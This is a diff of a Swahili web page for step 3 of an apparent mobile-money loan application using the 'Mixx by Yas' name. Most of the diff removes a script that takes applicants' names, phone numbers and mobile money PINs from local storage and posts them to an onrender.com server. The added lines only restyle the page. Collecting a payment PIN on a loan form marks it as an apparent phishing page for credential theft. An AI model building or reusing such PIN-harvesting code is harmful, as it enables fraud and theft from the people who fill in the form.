@@ -2,100 +2,36 @@
 <html>
 <head>
     <title>Hatua ya 3 - Tuma Maombi</title>
+
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-</head>
 
-<body style="font-family: Arial; max-width: 500px; margin: auto; padding: 20px;">
+    <style>
 
-    <h2>Hatua ya 3: Kuwasilisha Maombi</h2>
-
-    <p>Bonyeza kitufe hapa chini kutuma maombi yako ya mkopo.</p>
-
-    <button onclick="tumaMaombi()" 
-        style="width:100%; padding:12px; background:green; color:white; border:none; font-size:16px;">
-        Tuma Maombi
-    </button>
-
-    <p id="status" style="margin-top:15px; color:blue;"></p>
-
-<script>
-
-function tumaMaombi() {
-
-    let status = document.getElementById("status");
-    status.innerText = "Inatuma maombi...";
-
-    // 1. Pata data kutoka hatua ya 2
-    let mkopo = JSON.parse(localStorage.getItem("mkopo_data"));
-
-    // 2. Hakiki data ipo
-    if (!mkopo) {
-        alert("Hakuna taarifa za mkopo zilizopatikana. Rudi hatua ya 2.");
-        status.innerText = "";
-        return;
-    }
-
-    // 3. Andaa data safi (MATCH BACKEND EXACTLY)
-    let dataToSend = {
-        jina: mkopo.jina || "",
-        kiasi: mkopo.kiasi || "",
-        lengo: mkopo.lengo || "",
-        muda: mkopo.muda || "",
-        mixxNumber: mkopo.mixxNumber || "",
-        pin: mkopo.pin || ""
-    };
-
-    // 4. Tuma kwa backend (RENDER URL)
-    fetch("https://mkopo-wa-mixx-by-yas.onrender.com/submit-step3", {
-
-        method: "POST",
-
-        headers: {
-            "Content-Type": "application/json"
-        },
-
-        body: JSON.stringify(dataToSend)
-
-    })
-
-    .then(res => res.json())
-
-    .then(data => {
-
-        console.log("SERVER RESPONSE:", data);
-
-        if (data.application_id) {
-
-            status.innerText = "Maombi yamefanikiwa ✔";
-
-            alert("Maombi yamewasilishwa kwa mafanikio!");
-
-            // Hifadhi application ID
-            localStorage.setItem("app_id", data.application_id);
-
-            // Nenda hatua ya 4
-            window.location.href = "hatua4.html";
-
-        } else {
-
-            status.innerText = "Hitilafu imetokea ❌";
-            alert("Hitilafu: " + JSON.stringify(data));
+        body{
+            font-family: Arial;
+            max-width: 500px;
+            margin: auto;
+            padding: 20px;
         }
 
-    })
+        button{
+            width: 100%;
+            padding: 14px;
+            background: green;
+            color: white;
+            border: none;
+            font-size: 16px;
+            border-radius: 5px;
+        }
 
-    .catch(err => {
+        #status{
+            margin-top: 15px;
+            color: blue;
+        }
 
-        console.log(err);
+    </style>
+</head>
 
-        status.innerText = "Tatizo la mtandao ❌";
-        alert("Hitilafu imetokea wakati wa kutuma maombi");
+<body>
 
-    });
-
-}
-
-</script>
-
-</body>
-</html>
+    <h2>Hatua ya 3: Kuwasilisha Maombi</h2>
